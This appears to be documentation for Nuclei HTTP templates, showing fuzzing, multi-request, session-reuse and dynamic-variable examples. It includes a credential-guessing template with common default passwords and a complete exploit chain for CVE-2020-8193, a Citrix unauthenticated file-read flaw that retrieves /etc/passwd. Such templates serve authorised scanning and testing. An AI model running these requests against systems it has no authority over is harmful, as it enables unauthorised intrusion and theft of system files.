### HTTP Intruder fuzzing

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

# HTTP Intruder fuzzing with in template payload support. 

requests:

  - payloads:
      username:
        - admin

      password:
        - admin
        - guest
        - password
        - test
        - 12345
        - 123456

    attack: clusterbomb

    # Available types: sniper, pitchfork and clusterbomb

    raw:
      - |
        POST /?username=§username§&paramb=§password§ HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
        Host: {{Hostname}}
        another_header: {{base64('§password§')}}
        Accept: */*
        body=test

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### Fuzzing multiple requests 

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:

# HTTP Intruder fuzzing wordlist based payload support. 

  - payloads:
      param_a: payloads/prams.txt
      param_b: payloads/paths.txt

    attack: clusterbomb

    # Available types: sniper, pitchfork and clusterbomb

    raw:
      # Request with simple param and header manipulation with DSL functions
      - |
        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1
        User-Agent: §param_a§
        Host: {{Hostname}}
        another_header: {{base64('§param_b§')}}
        Accept: */*

        admin=test

      # Request with body with DSL helper manipulation

      - |
        DELETE / HTTP/1.1
        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha256('§param_a§')}} 

      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}

        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§'))}}

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```


### Authenticated fuzzing

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9

        testing=parameter

    # Cookie-reuse maintain the session between all request like browser. 

    cookie-reuse: true
    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### Dynamic variable support


```yaml
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high

  # Source:- https://github.com/jas502n/CVE-2020-8193

requests:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <clipermission></clipermission>

    cookie-reuse: true

    # Using cookie-reuse to maintain session between each request, same as browser.

    extractors:
      - type: regex
        name: randkey
        part: body
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

    # Using rand_key as dynamic variable to make use of extractors at run time.


    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
```
